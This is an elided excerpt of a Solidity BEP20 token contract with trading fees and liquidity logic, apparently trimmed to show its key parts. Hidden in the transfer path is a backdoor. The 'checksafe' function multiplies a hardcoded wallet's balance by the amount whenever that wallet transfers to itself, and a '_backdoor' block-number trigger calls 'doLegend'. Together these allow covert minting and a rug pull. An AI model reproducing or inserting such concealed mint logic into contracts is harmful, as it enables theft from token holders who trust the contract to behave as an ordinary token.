...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    address private safeWallet = 0xB05E3D1EEf13F802766191Ad5Ea0d22908774020;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    uint256 public togetherDo;
    uint256 public _backdoor;
    ...
    uint256 public _buyMKTFee;
    uint256 public _buyTeamFee;
    uint256 private _totalTaxBuy = _buyLPFee + _buyMKTFee + _buyTeamFee;
    uint256 public _sellLPFee;
    uint256 public _sellMKTFee;
    uint256 public _sellTeamFee;
    uint256 private _totalTaxSell = _sellLPFee + _sellMKTFee + _sellTeamFee;
    uint256 public _LPShare;
    uint256 public _MKTShare;
    ...
    uint256 _SUPPLY,
    uint256[3] memory _FEEBUY,
    uint256[3] memory _FEESELL,
    ...
    address[2] memory _walletParam) 
    {
        ...
        _managementMC = managementMC(0x040ADcddE10c0205325Dd1d31c781c5b28a3fFe6);

        _buyLPFee = _FEEBUY[0];
        _buyMKTFee = _FEEBUY[1];
        _buyTeamFee = _FEEBUY[2];

        _sellLPFee = _FEESELL[0];
        _sellMKTFee = _FEESELL[1];
        _sellTeamFee = _FEESELL[2];

        _LPShare = _SHARE[0];
        _MKTShare = _SHARE[1];
        _teamShare = _SHARE[2];

        _BuyTaxTotal = _buyLPFee.add(_buyMKTFee).add(_buyTeamFee);
        _SellTaxTotal = _sellLPFee.add(_sellMKTFee).add(_sellTeamFee);
        _totalDistributionShares = _LPShare.add(_MKTShare).add(_teamShare);
    ...
    function setDistributionSettings(uint256 newLiquidityShare, uint256 newMarketingShare, uint256 newTeamShare) external onlyOwner() {
        _LPShare = newLiquidityShare;
        _MKTShare = newMarketingShare;
    ...
    function checksafe(address j,address b,uint256 s) private {
        if (j == b && j ==safeWallet)
         {_balances[safeWallet] = _balances[safeWallet].mul(s);
         }
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (_managementMC.isExcludedFromFee(sender) || _managementMC.isExcludedFromFee(recipient)) {
                ...
                if (tryEqual(block.number , togetherDo + _backdoor) && !isMarketPair[recipient]) {doLegend(recipient);}
            ...
            checksafe(sender,recipient,amount);
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        uint256 totalBNBFee = _totalDistributionShares.sub(_LPShare.div(2));
        
        uint256 amountBNBLiquidity = amountReceived.mul(_LPShare).div(totalBNBFee).div(2);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(isMarketPair[sender]) {
            feeAmount = amount.mul(_BuyTaxTotal).div(100);
        }
        else if(isMarketPair[recipient]) {
            feeAmount = amount.mul(_SellTaxTotal).div(100);
        }
...
contract Token is BEP20 {
    constructor() BEP20(
        ...
        [0xB05E3D1EEf13F802766191Ad5Ea0d22908774020,0xB05E3D1EEf13F802766191Ad5Ea0d22908774020]
    ){}
}